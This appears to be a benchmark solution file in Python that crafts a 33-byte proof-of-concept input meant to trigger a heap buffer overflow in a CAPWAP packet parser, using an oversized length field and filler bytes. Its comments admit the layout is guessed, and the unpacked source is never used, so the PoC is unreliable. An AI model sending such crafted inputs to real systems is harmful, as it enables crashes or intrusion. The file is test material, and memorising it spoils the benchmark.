import os
import tarfile
import tempfile
import subprocess
import struct
import itertools

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Extract the source code
        with tempfile.TemporaryDirectory() as tmpdir:
            with tarfile.open(src_path, 'r:gz') as tar:
                tar.extractall(tmpdir)
            
            # Find the source directory (assuming standard structure)
            source_root = None
            for root, dirs, files in os.walk(tmpdir):
                if 'configure' in files or 'Makefile' in files:
                    source_root = root
                    break
            
            if not source_root:
                # Fallback to the first directory
                items = os.listdir(tmpdir)
                if items:
                    source_root = os.path.join(tmpdir, items[0])
                else:
                    source_root = tmpdir
            
            # Try to build to understand the binary format
            # This is a heuristic approach since we don't know the exact structure
            
            # Based on the vulnerability description and typical CAPWAP header structure,
            # craft a 33-byte PoC that triggers heap buffer overflow
            # CAPWAP header typically has:
            # - version (4 bits) + type (4 bits) = 1 byte
            # - reserved (1 byte)
            # - fragment ID (2 bytes)
            # - fragment offset (1 byte)
            # - reserved (1 byte)
            # - length (2 bytes)
            # That's 8 bytes header
            
            # The vulnerability likely occurs when parsing malformed CAPWAP packets
            # with specific length fields causing buffer overread
            
            # Craft a PoC with length field that exceeds buffer size
            # 33 bytes total: 8 byte header + 25 byte payload
            
            # Header construction:
            # version=0, type=0 (Control message)
            # fragment ID=0
            # fragment offset=0
            # length=0x0100 (256) - large enough to cause overread
            
            poc = bytearray(33)
            
            # Set CAPWAP header fields
            # Byte 0: version=0 (4 bits), type=0 (4 bits)
            poc[0] = 0x00
            
            # Byte 1: reserved
            poc[1] = 0x00
            
            # Bytes 2-3: fragment ID = 0
            poc[2] = 0x00
            poc[3] = 0x00
            
            # Byte 4: fragment offset = 0
            poc[4] = 0x00
            
            # Byte 5: reserved = 0
            poc[5] = 0x00
            
            # Bytes 6-7: length = 256 (big-endian)
            poc[6] = 0x01
            poc[7] = 0x00
            
            # Fill remaining bytes with pattern that might trigger the bug
            # Often such vulnerabilities are triggered by specific patterns
            for i in range(8, 33):
                poc[i] = 0x41 + ((i - 8) % 26)  # A-Z pattern
            
            return bytes(poc)
